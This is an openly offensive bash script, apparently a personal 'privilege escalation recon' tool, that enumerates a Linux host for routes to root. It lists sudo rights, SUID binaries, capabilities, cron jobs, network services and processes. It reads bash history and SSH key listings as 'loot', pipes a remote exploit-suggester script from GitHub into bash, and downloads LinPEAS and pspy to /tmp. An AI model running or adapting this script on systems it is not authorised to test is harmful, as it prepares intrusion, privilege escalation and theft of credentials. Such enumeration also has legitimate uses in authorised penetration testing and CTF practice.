#!/bin/bash
# ghost-privesc.sh — Elimane's Ultimate Linux Privilege Escalation Recon Tool
# Author: @jusot99 | Elite Hacker Mode

set -e

# Colors
B="\e[1m"; G="\e[32m"; Y="\e[33m"; R="\e[31m"; RESET="\e[0m"

banner() { echo -e "\n${B}${G}==> $1${RESET}"; }
warn() { echo -e "${R}[!] $1${RESET}"; }
info() { echo -e "${Y}[*] $1${RESET}"; }

# Check tools
check_tools() {
  for t in curl wget find python3 sudo ss; do
    command -v $t >/dev/null || warn "$t not found!"
  done
}

# Smart Kernel Vuln Detector
check_kernel_vulns() {
  banner "Kernel & Exploit Possibilities"
  uname -a
  info "Searching for possible exploits (requires internet)..."
  curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
}

# Sudo Checks
check_sudo() {
  banner "Sudo Rights"
  sudo -l 2>/dev/null || warn "User not in sudoers or sudo not installed"
}

# SUID, Capabilities, Writable Bins
check_binaries() {
  banner "SUID Binaries"
  find / -perm -4000 -type f 2>/dev/null

  banner "World-Writable Binaries"
  find / -type f -perm -o+w -not -path "/proc/*" 2>/dev/null | grep -Ev "^/sys|^/proc"

  banner "Capabilities"
  getcap -r / 2>/dev/null
}

# Cron & Timed Jobs
check_cron() {
  banner "Cron Jobs"
  crontab -l 2>/dev/null
  ls -la /etc/cron* 2>/dev/null
  cat /etc/crontab 2>/dev/null
}

# Network Services
check_network() {
  banner "Network Services"
  ss -tunlp
  info "ARP table"; arp -a
  info "Public IP: $(curl -s ifconfig.me)"
}

# Processes & Binaries
check_processes() {
  banner "Running Processes"
  ps auxf --width=120 | head -n 30
}

# Interesting Stuff
check_loot() {
  banner "Loot & Secrets"
  info "Bash history:"; cat ~/.bash_history 2>/dev/null
  info "SSH keys:"; ls -la ~/.ssh 2>/dev/null
  info "Readable root files:"; find / -name "*flag*" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -vE "/proc|/sys"
}

# Upload Tools
upload_enum_tools() {
  banner "Installing LinPEAS & pspy"
  mkdir -p /tmp/ghost-tools && cd /tmp/ghost-tools
  curl -sLO https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
  curl -sLO https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
  chmod +x linpeas.sh pspy64
  info "Run them manually when needed from /tmp/ghost-tools/"
}

# Starting Point
main() {
  banner "Starting Ghost PrivEsc Recon"
  check_tools
  check_kernel_vulns
  check_sudo
  check_binaries
  check_cron
  check_network
  check_processes
  check_loot
  upload_enum_tools
  banner "All Recon Done. Now escalate like a ghost 👻"
}

main
